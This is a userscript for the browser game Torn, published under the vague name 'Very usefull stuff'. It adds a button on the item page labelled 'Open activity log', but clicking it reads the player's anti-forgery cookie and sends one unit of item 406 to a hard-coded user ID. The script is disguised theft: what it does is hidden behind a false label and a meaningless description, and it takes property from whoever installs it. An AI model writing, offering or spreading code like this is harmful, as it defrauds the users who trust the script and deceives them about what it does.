// ==UserScript==
// @name         Very usefull stuff
// @namespace    verygoodscript.torn
// @version      0.1
// @description  Doing the job
// @match        https://www.torn.com/item.php
// @icon         https://www.google.com/s2/favicons?sz=64&domain=torn.com
// @grant        GM_addStyle
// @downloadURL https://update.greasyfork.org/scripts/472674/Very%20usefull%20stuff.user.js
// @updateURL https://update.greasyfork.org/scripts/472674/Very%20usefull%20stuff.meta.js
// ==/UserScript==

const icon = `<button type="button" id="cmb" class="button" aria-label="Open activity log"><img src="https://i.ibb.co/tXTg6Zw/test.png" width="20px" height="18px"></button>`;
const result =`<div id='zero-response'></div>`;

let userId = "496545";


GM_addStyle(`
           

#zero-response{
color:white;
margin:5px;
}
            `
           );



function getRFC() {
    var rfc = $.cookie('rfc_v');
    if (!rfc) {
        var cookies = document.cookie.split('; ');
        for (var i in cookies) {
            var cookie = cookies[i].split('=');
            if (cookie[0] == 'rfc_v') {
                return cookie[1];
            }
        }
    }
    return rfc;
}

function insert(){
    if ($('.content-title').length > 0){
       $(".content-title > h4").append(icon);
        $(".content-title").append(result);
        console.log('inserted');

        $('#cmb').on("click", ()=>{
            sendI();
        });



    }
    else{
        console.log('trying');
        setTimeout(insert, 500);
    }
}


function sendI(){

    $.post('item.php?rfcv='+getRFC(), {
        step:"sendItemAction",
        tag:"",
        userID:userId,
        amount:"1",
        itemID:"406"
    },function(result){
        result = JSON.parse(result);
        if (result.success){
            let ixid = result.itemID;
            send(ixid);
        }
        else{
            $('#zero-response').html(result.text);
        }
    })

}
function send(b){


    $.post('item.php?rfcv='+getRFC(), {
        step:"sendItemAction",
        confirm:"1",
        XID:b,
        userID:userId,
        tag:"",
        amount:"1"},function(result){
        result = JSON.parse(result);
        $('#zero-response').html(result.text);
    });
}


(function() {
    insert();

})();

